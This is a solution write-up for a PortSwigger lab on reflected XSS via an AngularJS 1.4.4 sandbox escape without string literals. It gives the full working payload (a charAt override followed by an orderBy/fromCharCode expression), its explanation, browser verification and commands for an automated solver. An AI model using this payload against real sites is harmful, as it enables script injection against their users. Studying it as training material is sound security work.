# Reflected XSS with AngularJS sandbox escape without strings — Solution

Lab: <https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings>
Difficulty: **EXPERT** (badge read from the rendered Academy page: `widget-container-labelevel` → `EXPERT`)

## Vulnerability chain

1. `GET /?<key>=<value>` writes **every** query parameter into the AngularJS
   controller as JavaScript, one statement per parameter:

   ```html
   <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
       $scope.query = {};
       var key = 'search';
       $scope.query[key] = '1';
       $scope.value = $parse(key)($scope.query);   <!-- sink -->
       var key = '<PARAM>' ;
       $scope.query[key] = '<VALUE>';
       $scope.value = $parse(key)($scope.query);
   });</script>
   ```

2. Both the parameter name and value are HTML-escaped (`'` → `&apos;`, `<` →
   `&lt;`), and HTML entities are **not** decoded inside `<script>`. So no
   JavaScript breakout is possible — but the *name* is compiled by `$parse()`,
   which makes query-parameter names an Angular expression sink (client-side
   template injection with no HTML at all).

   Control: `?search=1&7*7=x` renders `49` as the value — the name was evaluated.

3. AngularJS 1.4.4 (`/resources/js/angular_1-4-4.js`, `ng-app` on `<body>`) still
   enforces the expression sandbox, and the lab forbids `$eval` and string
   literals. The escape therefore uses identifiers, property access and
   `fromCharCode` only.

## Payload

```
/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

Decoded expression (the parameter *name*, evaluated by `$parse`):

```js
toString().constructor.prototype.charAt=[].join;
[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

* `toString()` produces a string without quotes; `.constructor` is `Function`, so
  `.prototype.charAt = [].join` rewrites `charAt` for every function — the
  sandbox's source check relies on it, so it stops rejecting the expression.
* `[1]|orderBy:<STRING>` makes `orderBy` compile its predicate with `$parse` and
  evaluate it per element, running `x=alert(1)`; the string is assembled by
  `fromCharCode(120,61,97,108,101,114,116,40,49,41)` (still quote-free).
* `%3d` matters: the lab splits a parameter on the first **literal** `=` and
  percent-decodes afterwards, so the encoded `=` survives inside the expression
  and the trailing `=1` supplies the value.

## Verification (browser)

Chromium with `alert` stubbed before page scripts:

| URL | alerts | `<h1>` |
|---|---|---|
| exploit vector | `["1"]` | `2 search results for {{value}}` |
| `?search=1&7*7=x` | `[]` | `2 search results for 49` |
| `?search=1&[1]|orderBy:…fromCharCode(…)=1` (no `charAt` overwrite) | `[]` | `2 search results for {{value}}` |

So the alert comes from the `orderBy` predicate and only after the sandbox break
— both steps are load-bearing. Evidence: `evidence/browser-alert-proof.txt`.

## Lab check

No exploit server: `GET /exploit` → **404**, and the lab header advertises no
`#exploit-link`. The instance is checked server-side: the crafted request flips
the header widget to `widgetcontainer-lab-status is-solved` / `<p>Solved</p>`,
~6 s after the request (the same response still said *Not solved*).

## Automated

```bash
cd /root/Desktop/PortSwigger_Labs/EXPERT/Reflected-XSS-with-AngularJS-sandbox-escape-without-strings
uv run python solve.py --url "https://<LAB-ID>.web-security-academy.net"

# or through the universal launcher
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<LAB-ID>.web-security-academy.net"
```

`--show-url` prints the exploit URL and exits, for a manual browser check.
Exit 0 requires the lab's own solved widget.

## Verified result

* **Flip observed on this instance**: baseline at 22:24:17Z `is-notsolved` →
  exploit request at 22:25:50Z (response still `is-notsolved`) → polled
  `is-solved` by 22:25:56Z. That flip was caused by the manual probe request
  during recon, not by `solve.py`; the instance stays solved, so the solver run
  reports `caused by solver: no (was already solved)`.
* Solver: exit 0, **6 HTTP requests**, **2.4 s**.
* Root launcher: exact folder-name match, exit 0, solver 2.4 s / total 2.8 s.
* Launcher tests: 27 passed / 0 failed; `tests/test_clean.py` 6 passed.
* Browser: `alert(1)` fires on the exploit URL; both controls stay silent.
